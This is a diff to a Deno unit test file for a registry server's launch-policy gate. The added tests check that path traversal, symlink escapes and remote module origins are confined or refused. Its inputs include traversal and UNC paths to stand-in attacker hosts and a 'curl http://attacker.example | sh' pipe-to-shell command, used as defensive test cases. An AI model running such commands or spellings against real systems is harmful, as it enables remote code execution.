@@ -5,17 +5,53 @@
  * Unit: {@link launchDenial} — the policy deciding whether a registry
  * descriptor's launch location may be spawned. The registry server runs what
  * the registry tells it to, so a descriptor pointing at a remote entry module is
- * a remote code-execution primitive unless the operator named its origin.
+ * a remote code-execution primitive unless the operator named its origin, and
+ * one pointing at a local file outside the allowed directories is the same
+ * primitive for anyone who can write a file on the host.
  */
 
 import { assertEquals } from "./_assert.ts";
 import {
+  hostLaunchFileSystem,
   LAUNCH_COMMANDS_ENV,
+  LAUNCH_DIRS_ENV,
   LAUNCH_HOSTS_ENV,
   launchDenial,
+  type LaunchFileSystem,
 } from "../src/registry/launch_policy.ts";
 import { ALLOW_INSECURE_ENV } from "../src/http.ts";
 import type { BuildLocation } from "../src/registry/descriptor.ts";
+
+/**
+ * A fake filesystem confined by default to `/work`. `links` maps a symlink's
+ * path to its target; `realPath` follows them by prefix, as the OS would.
+ */
+function fakeFs(
+  links: Record<string, string> = {},
+  defaultDir = "/work",
+): LaunchFileSystem {
+  return {
+    defaultDir,
+    realPath: (path) => {
+      if (path.includes("unresolvable")) return undefined;
+      for (const [link, target] of Object.entries(links)) {
+        if (path === link || path.startsWith(`${link}/`)) {
+          return target + path.slice(link.length);
+        }
+      }
+      return path;
+    },
+  };
+}
+
+/** {@link launchDenial} over `fs` (default {@link fakeFs}). */
+function deny(
+  location: BuildLocation,
+  readEnv: (name: string) => string | undefined,
+  fs: LaunchFileSystem = fakeFs(),
+) {
+  return launchDenial(location, readEnv, fs);
+}
 
 /** Build a `readEnv` over a plain record. */
 function env(
@@ -34,23 +70,275 @@ function commandOf(...command: string[]): BuildLocation {
   return { kind: "command", command, cwd: "/work" };
 }
 
-Deno.test("a local entry module is always allowed", () => {
+Deno.test("a local entry module inside the allowed directory is allowed", () => {
   for (
     const module of [
-      "file:///srv/app/zuke.ts", // what `zuke register` writes (Deno.mainModule)
-      "/srv/app/zuke.ts",
+      "file:///work/zuke.ts", // what `zuke register` writes (Deno.mainModule)
+      "file://localhost/work/zuke.ts",
+      "/work/zuke.ts",
+      "/work/sub/../zuke.ts",
       "./zuke.ts",
       "zuke.ts",
-      "C:\\src\\app\\zuke.ts",
-      "c:/src/app/zuke.ts",
+      "file:///work/a%20b/zuke.ts",
     ]
   ) {
-    assertEquals(launchDenial(moduleAt(module), env()), null, module);
+    assertEquals(deny(moduleAt(module), env()), null, module);
+  }
+  // The allowed directory itself may be the working directory, or hold it.
+  assertEquals(
+    deny({ kind: "module", module: "/work/zuke.ts", cwd: "/work/sub" }, env()),
+    null,
+  );
+});
+
+Deno.test("a Windows drive path is confined case-insensitively", () => {
+  const fs = fakeFs({}, "C:\\Work");
+  for (
+    const module of [
+      "C:\\work\\zuke.ts",
+      "c:/WORK/zuke.ts",
+      "file:///C:/Work/zuke.ts",
+      "zuke.ts",
+    ]
+  ) {
+    assertEquals(
+      deny({ kind: "module", module, cwd: "C:\\Work" }, env(), fs),
+      null,
+      module,
+    );
+  }
+  assertEquals(
+    deny(
+      { kind: "module", module: "D:\\work\\zuke.ts", cwd: "C:\\Work" },
+      env(),
+      fs,
+    )
+      ?.reason,
+    "launch_dir_not_allowed",
+  );
+});
+
+Deno.test("a local entry module outside the allowed directories is refused", () => {
+  // The finding's scenario: a registry writer drops /tmp/evil.ts and names it.
+  for (
+    const module of [
+      "/tmp/evil.ts",
+      "file:///tmp/evil.ts",
+      "../tmp/evil.ts",
+      "/work/../tmp/evil.ts",
+      "file:///work/..%2F..%2Ftmp/evil.ts",
+      // Not valid UTF-8, so it cannot be decoded whole; Deno still opens it.
+      "file:///work/..%2F..%2Ftmp%2Fevil%E0.ts",
+    ]
+  ) {
+    const denial = deny(moduleAt(module), env());
+    assertEquals(denial?.reason, "launch_dir_not_allowed", module);
+    assertEquals(denial?.detail.includes(LAUNCH_DIRS_ENV), true);
+    assertEquals(denial?.detail.includes("entry module"), true);
+  }
+});
+
+Deno.test("a sibling sharing the allowed directory's prefix is outside it", () => {
+  assertEquals(
+    deny(
+      { kind: "module", module: "/work-evil/x.ts", cwd: "/work-evil" },
+      env(),
+    )?.reason,
+    "launch_dir_not_allowed",
+  );
+  assertEquals(
+    deny(moduleAt("/work-evil/x.ts"), env())?.reason,
+    "launch_dir_not_allowed",
+  );
+});
+
+Deno.test("a working directory outside the allowed directories is refused", () => {
+  const outside: BuildLocation = {
+    kind: "module",
+    module: "/work/zuke.ts",
+    cwd: "/tmp",
+  };
+  const denial = deny(outside, env());
+  assertEquals(denial?.reason, "launch_dir_not_allowed");
+  assertEquals(denial?.detail.includes("working directory"), true);
+  // A relative working directory has no fixed place to confine.
+  assertEquals(
+    deny({ kind: "module", module: "/work/zuke.ts", cwd: "work" }, env())
+      ?.reason,
+    "launch_dir_not_allowed",
+  );
+  // The working directory is the writer's to choose for a remote module too.
+  assertEquals(
+    deny(
+      {
+        kind: "module",
+        module: "https://builds.example.com/z.ts",
+        cwd: "/tmp",
+      },
+      env({ [LAUNCH_HOSTS_ENV]: "builds.example.com" }),
+    )?.reason,
+    "launch_dir_not_allowed",
+  );
+});
+
+Deno.test("a symlink out of the allowed directory does not carry its target inside", () => {
+  const fs = fakeFs({ "/work/link": "/tmp/planted" });
+  assertEquals(
+    deny(moduleAt("/work/link/evil.ts"), env(), fs)?.reason,
+    "launch_dir_not_allowed",
+  );
+  assertEquals(
+    deny(
+      { kind: "module", module: "/work/zuke.ts", cwd: "/work/link" },
+      env(),
+      fs,
+    )
+      ?.reason,
+    "launch_dir_not_allowed",
+  );
+  // A path that cannot be resolved at all is refused, not guessed at.
+  assertEquals(
+    deny(moduleAt("/work/unresolvable/zuke.ts"), env())?.reason,
+    "launch_dir_not_allowed",
+  );
+});
+
+Deno.test("an allowed directory reached through a symlink is compared canonically", () => {
+  // The operator names /link; it resolves to /real, as do the paths under it.
+  const fs = fakeFs({ "/link": "/real" }, "/link");
+  assertEquals(
+    deny({ kind: "module", module: "/link/zuke.ts", cwd: "/link" }, env(), fs),
+    null,
+  );
+});
+
+Deno.test("the operator names the allowed directories, or turns confinement off", () => {
+  const elsewhere: BuildLocation = {
+    kind: "module",
+    module: "/srv/b/zuke.ts",
+    cwd: "/srv/b",
+  };
+  assertEquals(deny(elsewhere, env())?.reason, "launch_dir_not_allowed");
+  // The list replaces the default, separated by commas or newlines, so a path
+  // with a space can be named; a relative entry matches nothing.
+  assertEquals(
+    deny(elsewhere, env({ [LAUNCH_DIRS_ENV]: "/opt/x ,\n/srv/b" })),
+    null,
+  );
+  assertEquals(
+    deny(moduleAt("/work/zuke.ts"), env({ [LAUNCH_DIRS_ENV]: "/srv/b" }))
+      ?.reason,
+    "launch_dir_not_allowed",
+  );
+  assertEquals(
+    deny(elsewhere, env({ [LAUNCH_DIRS_ENV]: "srv/b" }))?.reason,
+    "launch_dir_not_allowed",
+  );
+  // Directories are not case-folded on a POSIX path.
+  assertEquals(
+    deny(elsewhere, env({ [LAUNCH_DIRS_ENV]: "/SRV/b" }))?.reason,
+    "launch_dir_not_allowed",
+  );
+  assertEquals(
+    deny(moduleAt("/tmp/evil.ts"), env({ [LAUNCH_DIRS_ENV]: "*" })),
+    null,
+  );
+  // Naming the filesystem root is the same decision, spelled as a directory.
+  assertEquals(
+    deny(moduleAt("/tmp/evil.ts"), env({ [LAUNCH_DIRS_ENV]: "/" })),
+    null,
+  );
+  // Turning confinement off does not admit an origin nobody named.
+  assertEquals(
+    deny(
+      moduleAt("https://attacker.example/x.ts"),
+      env({ [LAUNCH_DIRS_ENV]: "*" }),
+    )?.reason,
+    "launch_origin_not_allowed",
+  );
+});
+
+Deno.test("a module on another host spelled as a path is remote", () => {
+  // Windows opens every one of these over SMB, so each is a fetch the origin
+  // allow-list has to approve, named by its host.
+  const cases: [string, string][] = [
+    ["file://attacker.example/share/x.ts", "attacker.example"],
+    ["//attacker.example/x.ts", "attacker.example"],
+    ["\\\\attacker\\share\\x.ts", "attacker"],
+    ["/\\attacker/share/x.ts", "attacker"],
+    ["file:///%2F%2Fattacker/share/x.ts", "attacker"],
+  ];
+  for (const [module, host] of cases) {
+    const denial = deny(moduleAt(module), env());
+    assertEquals(denial?.reason, "launch_origin_not_allowed", module);
+    assertEquals(denial?.detail.includes(`"${host}"`), true, module);
+    assertEquals(
+      deny(moduleAt(module), env({ [LAUNCH_HOSTS_ENV]: host })),
+      null,
+      module,
+    );
+  }
+  // Any run of leading separators reads as a host, and is refused as one.
+  assertEquals(
+    deny(moduleAt("///work/zuke.ts"), env())?.reason,
+    "launch_origin_not_allowed",
+  );
+  // The same spelling as a command argument faces the same rule.
+  assertEquals(
+    deny(
+      commandOf("deno", "run", "\\\\attacker\\share\\x.ts"),
+      env({ [LAUNCH_COMMANDS_ENV]: "deno" }),
+    )?.reason,
+    "launch_origin_not_allowed",
+  );
+});
+
+Deno.test("the host filesystem resolves symlinks and missing tails", async () => {
+  if (Deno.build.os === "windows") return; // symlink creation is privileged there
+  const dir = await Deno.realPath(await Deno.makeTempDir());
+  try {
+    // The default directory is the project root above the working directory,
+    // or the working directory itself when there is none.
+    const fs = hostLaunchFileSystem();
+    assertEquals(fs.defaultDir, Deno.cwd());
+    const previous = Deno.cwd();
+    Deno.chdir(dir);
+    try {
+      assertEquals(hostLaunchFileSystem().defaultDir, dir);
+    } finally {
+      Deno.chdir(previous);
+    }
+    await Deno.mkdir(`${dir}/inside`);
+    await Deno.mkdir(`${dir}/outside`);
+    await Deno.writeTextFile(`${dir}/inside/file`, "");
+    await Deno.symlink(`${dir}/outside`, `${dir}/inside/link`);
+    const real = (path: string) => fs.realPath(path)?.replace(/\\/g, "/");
+    const slashed = dir.replace(/\\/g, "/");
+    assertEquals(real(`${dir}/inside/link`), `${slashed}/outside`);
+    // A missing tail keeps its name under the resolved ancestor.
+    assertEquals(
+      real(`${dir}/inside/link/missing/x.ts`),
+      `${slashed}/outside/missing/x.ts`,
+    );
+    // A dangling link could be pointed anywhere later, so it does not resolve,
+    // nor does anything beneath it.
+    await Deno.symlink(`${dir}/outside/later`, `${dir}/inside/dangling`);
+    assertEquals(fs.realPath(`${dir}/inside/dangling`), undefined);
+    assertEquals(fs.realPath(`${dir}/inside/dangling/x.ts`), undefined);
+    // A missing path straight under the filesystem root keeps its name.
+    assertEquals(
+      fs.realPath("/zuke-launch-policy-missing"),
+      "/zuke-launch-policy-missing",
+    );
+    // A file used as a directory cannot be resolved.
+    assertEquals(fs.realPath(`${dir}/inside/file/x.ts`), undefined);
+  } finally {
+    await Deno.remove(dir, { recursive: true });
   }
 });
 
 Deno.test("a remote entry module is refused unless its origin is allow-listed", () => {
-  const denial = launchDenial(
+  const denial = deny(
     moduleAt("https://attacker.example/x.ts"),
     env(),
   );
@@ -59,7 +347,7 @@ Deno.test("a remote entry module is refused unless its origin is allow-listed", 
   assertEquals(denial?.detail.includes(LAUNCH_HOSTS_ENV), true);
 
   assertEquals(
-    launchDenial(
+    deny(
       moduleAt("https://builds.example.com/zuke.ts"),
       env({ [LAUNCH_HOSTS_ENV]: "builds.example.com" }),
     ),
@@ -67,7 +355,7 @@ Deno.test("a remote entry module is refused unless its origin is allow-listed", 
   );
   // A list, with either separator, and matched case-insensitively.
   assertEquals(
-    launchDenial(
+    deny(
       moduleAt("https://Builds.Example.com/zuke.ts"),
       env({ [LAUNCH_HOSTS_ENV]: "a.example, builds.example.com  b.example" }),
     ),
@@ -75,7 +363,7 @@ Deno.test("a remote entry module is refused unless its origin is allow-listed", 
   );
   // Allow-listing one host does not admit another.
   assertEquals(
-    launchDenial(
+    deny(
       moduleAt("https://attacker.example/x.ts"),
       env({ [LAUNCH_HOSTS_ENV]: "builds.example.com" }),
     )?.reason,
@@ -83,7 +371,7 @@ Deno.test("a remote entry module is refused unless its origin is allow-listed", 
   );
   // A suffix of an allow-listed host is a different host.
   assertEquals(
-    launchDenial(
+    deny(
       moduleAt("https://evil-builds.example.com/x.ts"),
       env({ [LAUNCH_HOSTS_ENV]: "builds.example.com" }),
     )?.reason,
@@ -93,7 +381,7 @@ Deno.test("a remote entry module is refused unless its origin is allow-listed", 
 
 Deno.test("a wildcard allow-list admits any origin", () => {
   assertEquals(
-    launchDenial(
+    deny(
       moduleAt("https://anywhere.example/x.ts"),
       env({ [LAUNCH_HOSTS_ENV]: "*" }),
     ),
@@ -105,29 +393,29 @@ Deno.test("a remote specifier with no hostname is named by its scheme", () => {
   // `deno run jsr:@scope/build` fetches and executes code just as an https URL
   // does, but has no hostname — so the scheme is what an operator allow-lists.
   assertEquals(
-    launchDenial(moduleAt("jsr:@scope/build"), env())?.reason,
+    deny(moduleAt("jsr:@scope/build"), env())?.reason,
     "launch_origin_not_allowed",
   );
   assertEquals(
-    launchDenial(
+    deny(
       moduleAt("jsr:@scope/build"),
       env({ [LAUNCH_HOSTS_ENV]: "jsr:" }),
     ),
     null,
   );
   assertEquals(
-    launchDenial(moduleAt("npm:some-build"), env())?.reason,
+    deny(moduleAt("npm:some-build"), env())?.reason,
     "launch_origin_not_allowed",
   );
   assertEquals(
-    launchDenial(moduleAt("data:text/plain,console.log(1)"), env())?.reason,
+    deny(moduleAt("data:text/plain,console.log(1)"), env())?.reason,
     "launch_origin_not_allowed",
   );
 });
 
 Deno.test("an allow-listed plaintext origin still needs the insecure opt-out", () => {
   const allowed = env({ [LAUNCH_HOSTS_ENV]: "builds.example.com" });
-  const denial = launchDenial(
+  const denial = deny(
     moduleAt("http://builds.example.com/zuke.ts"),
     allowed,
   );
@@ -135,7 +423,7 @@ Deno.test("an allow-listed plaintext origin still needs the insecure opt-out", (
   assertEquals(denial?.detail.includes(ALLOW_INSECURE_ENV), true);
 
   assertEquals(
-    launchDenial(
+    deny(
       moduleAt("http://builds.example.com/zuke.ts"),
       env({
         [LAUNCH_HOSTS_ENV]: "builds.example.com",
@@ -147,14 +435,14 @@ Deno.test("an allow-listed plaintext origin still needs the insecure opt-out", (
   // Loopback needs no opt-out — there is no path to sit on — but it is still
   // remote code, so it is still allow-listed.
   assertEquals(
-    launchDenial(
+    deny(
       moduleAt("http://localhost:8000/zuke.ts"),
       env({ [LAUNCH_HOSTS_ENV]: "localhost" }),
     ),
     null,
   );
   assertEquals(
-    launchDenial(moduleAt("http://localhost:8000/zuke.ts"), env())?.reason,
+    deny(moduleAt("http://localhost:8000/zuke.ts"), env())?.reason,
     "launch_origin_not_allowed",
   );
 });
@@ -163,13 +451,13 @@ Deno.test("a command location is refused unless its program is allow-listed", ()
   // The registry writer chooses the program *and* its arguments, so a command
   // descriptor is code execution on a registry's say-so — the same threat the
   // module gate refuses, spelled without a fetch.
-  const denial = launchDenial(commandOf("./zuke", "--"), env());
+  const denial = deny(commandOf("./zuke", "--"), env());
   assertEquals(denial?.reason, "launch_command_not_allowed");
   assertEquals(denial?.detail.includes(LAUNCH_COMMANDS_ENV), true);
   assertEquals(denial?.detail.includes("./zuke"), true);
 
   assertEquals(
-    launchDenial(
+    deny(
       commandOf("./zuke", "--"),
       env({ [LAUNCH_COMMANDS_ENV]: "./zuke" }),
     ),
@@ -180,14 +468,14 @@ Deno.test("a command location is refused unless its program is allow-listed", ()
 Deno.test("the command allow-list matches the program exactly", () => {
   // An entry admits the exact string the descriptor wrote, and nothing else.
   assertEquals(
-    launchDenial(
+    deny(
       commandOf("make", "release"),
       env({ [LAUNCH_COMMANDS_ENV]: "make" }),
     ),
     null,
   );
   assertEquals(
-    launchDenial(
+    deny(
       commandOf("/usr/bin/make", "release"),
       env({ [LAUNCH_COMMANDS_ENV]: "/usr/bin/make" }),
     ),
@@ -195,7 +483,7 @@ Deno.test("the command allow-list matches the program exactly", () => {
   );
   // Case folds, because Windows program names do.
   assertEquals(
-    launchDenial(
+    deny(
       commandOf("MAKE"),
       env({ [LAUNCH_COMMANDS_ENV]: "make" }),
     ),
@@ -220,14 +508,14 @@ Deno.test("a bare allow-list entry does not admit a same-named file elsewhere", 
     ]
   ) {
     assertEquals(
-      launchDenial(commandOf(program, "release"), allowed)?.reason,
+      deny(commandOf(program, "release"), allowed)?.reason,
       "launch_command_not_allowed",
       `${program} must not be admitted by the bare entry "make"`,
     );
   }
   // The converse: an absolute entry does not admit the bare name either.
   assertEquals(
-    launchDenial(
+    deny(
       commandOf("make"),
       env({ [LAUNCH_COMMANDS_ENV]: "/usr/bin/make" }),
     )
@@ -241,12 +529,12 @@ Deno.test("a program that trims to nothing is never admitted", () => {
   // whitespace must be refused on its own account, not by that coincidence.
   for (const program of [" ", "\t", "\u00a0", "\u200b"]) {
     assertEquals(
-      launchDenial(commandOf(program), env({ [LAUNCH_COMMANDS_ENV]: "make" }))
+      deny(commandOf(program), env({ [LAUNCH_COMMANDS_ENV]: "make" }))
         ?.reason,
       "launch_command_not_allowed",
     );
     assertEquals(
-      launchDenial(commandOf(program), env({ [LAUNCH_COMMANDS_ENV]: "" }))
+      deny(commandOf(program), env({ [LAUNCH_COMMANDS_ENV]: "" }))
         ?.reason,
       "launch_command_not_allowed",
     );
@@ -264,19 +552,19 @@ Deno.test("the command allow-list is comma-separated, so a path may contain spac
     ]
   ) {
     assertEquals(
-      launchDenial(commandOf("deploy.sh"), env({ [LAUNCH_COMMANDS_ENV]: raw })),
+      deny(commandOf("deploy.sh"), env({ [LAUNCH_COMMANDS_ENV]: raw })),
       null,
     );
   }
   assertEquals(
-    launchDenial(
+    deny(
       commandOf("C:\\Program Files\\make.EXE"),
       env({ [LAUNCH_COMMANDS_ENV]: "make, c:\\program files\\make.exe" }),
     ),
     null,
   );
   assertEquals(
-    launchDenial(
+    deny(
       commandOf("/bin/sh", "-c", "curl http://attacker.example | sh"),
       env({ [LAUNCH_COMMANDS_ENV]: "*" }),
     ),
@@ -284,7 +572,7 @@ Deno.test("the command allow-list is comma-separated, so a path may contain spac
   );
   // An unrelated entry does not admit it.
   assertEquals(
-    launchDenial(
+    deny(
       commandOf("/bin/sh", "-c", "id"),
       env({ [LAUNCH_COMMANDS_ENV]: "make" }),
     )
@@ -296,15 +584,15 @@ Deno.test("the command allow-list is comma-separated, so a path may contain spac
 Deno.test("an empty command is left for the caller to report", () => {
   // The server answers "no runnable launch command", which says more than a
   // policy denial would; the gate must not turn that into a refusal.
-  assertEquals(launchDenial(commandOf(), env()), null);
-  assertEquals(launchDenial(commandOf(""), env()), null);
+  assertEquals(deny(commandOf(), env()), null);
+  assertEquals(deny(commandOf(""), env()), null);
 });
 
 Deno.test("the host allow-list does not admit a command program", () => {
   // The two lists are separate decisions: trusting an origin to serve a module
   // is not trusting a registry to name a program and its arguments.
   assertEquals(
-    launchDenial(
+    deny(
       commandOf("make"),
       env({ [LAUNCH_HOSTS_ENV]: "*" }),
     )?.reason,
@@ -318,7 +606,7 @@ Deno.test("an allow-listed program may not fetch from an un-allow-listed origin"
   // remote-module case written as a command, so the origin rule applies to the
   // arguments too.
   const allowed = env({ [LAUNCH_COMMANDS_ENV]: "deno" });
-  const denial = launchDenial(
+  const denial = deny(
     commandOf("deno", "run", "-A", "https://attacker.example/x.ts"),
     allowed,
   );
@@ -327,7 +615,7 @@ Deno.test("an allow-listed program may not fetch from an un-allow-listed origin"
 
   // Naming the origin as well allows it, exactly as it would for a module.
   assertEquals(
-    launchDenial(
+    deny(
       commandOf("deno", "run", "-A", "https://builds.example.com/zuke.ts"),
       env({
         [LAUNCH_COMMANDS_ENV]: "deno",
@@ -344,14 +632,14 @@ Deno.test("a plaintext argument needs the insecure opt-out, like a module", () =
     [LAUNCH_HOSTS_ENV]: "builds.example.com",
   };
   assertEquals(
-    launchDenial(
+    deny(
       commandOf("deno", "run", "http://builds.example.com/zuke.ts"),
       env(base),
     )?.reason,
     "insecure_launch_url",
   );
   assertEquals(
-    launchDenial(
+    deny(
       commandOf("deno", "run", "http://builds.example.com/zuke.ts"),
       env({ ...base, [ALLOW_INSECURE_ENV]: "1" }),
     ),
@@ -363,7 +651,7 @@ Deno.test("ordinary local arguments are untouched by the origin rule", () => {
   // The rule is about fetching, not about arguments in general: a path, a flag
   // and a bare word are not specifiers and must not be mistaken for one.
   assertEquals(
-    launchDenial(
+    deny(
       commandOf(
         "make",
         "-f",
@@ -382,7 +670,7 @@ Deno.test("the wildcard program list still refuses a remote argument", () => {
   // `*` says the operator trusts the registry to pick programs. Fetching code
   // from an origin they never named is a separate decision, still theirs.
   assertEquals(
-    launchDenial(
+    deny(
       commandOf("deno", "run", "https://attacker.example/x.ts"),
       env({ [LAUNCH_COMMANDS_ENV]: "*" }),
     )?.reason,
